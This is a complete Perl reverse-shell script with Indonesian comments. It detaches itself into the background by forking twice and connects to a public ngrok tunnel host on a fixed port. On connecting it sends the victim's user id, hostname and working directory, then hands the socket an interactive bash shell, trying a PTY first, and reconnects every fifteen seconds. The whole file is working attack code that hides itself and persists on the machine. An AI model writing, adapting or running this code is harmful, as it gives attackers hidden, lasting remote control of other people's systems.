#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use POSIX;

# ================= CONFIGURATION =================
my $SERVER = "0.tcp.ap.ngrok.io";
my $PORT   = 4212;  # GANTI PORT KE 4212
my $SHELL  = "/bin/bash";  # Ganti ke bash jika ada
# =================================================

# Daemonize
fork() && exit;
setsid();
fork() && exit;
chdir "/";

while (1) {
    my $socket;
    
    eval {
        # Create socket
        socket($socket, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        
        # Connect
        my $addr = inet_aton($SERVER) or die "Cannot resolve";
        my $port = sockaddr_in($PORT, $addr);
        
        connect($socket, $port) or die "Connect failed";
        
        # ============ KIRIM INFO AWAL ============
        print $socket "=== AUTO-EXECUTE ON CONNECT ===\n";
        print $socket "User: " . `id`;
        print $socket "Host: " . `hostname`;
        print $socket "PWD: " . `pwd`;
        print $socket "===============================\n";
        
        # ============ SPAWN SHELL DENGAN PIPE ============
        # Gunakan pipe untuk komunikasi dua arah
        pipe(my $reader, my $writer);
        
        my $pid = fork();
        
        if ($pid == 0) {
            # Child: Baca dari socket, tulis ke shell
            close($reader);
            close($writer);
            
            # Duplicate socket ke stdio
            open(STDIN, "<&", $socket);
            open(STDOUT, ">&", $socket);
            open(STDERR, ">&", $socket);
            
            # Coba spawn shell dengan PTY
            exec("script -qc /bin/bash /dev/null") ||  # Coba dengan script
            exec("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'") ||
            exec("/bin/bash -i");
            exit(0);
        } else {
            # Parent: Pertahankan koneksi
            close($socket);
            waitpid($pid, 0);  # Tunggu shell exit
        }
        
        close($socket);
    };
    
    sleep(15);
}
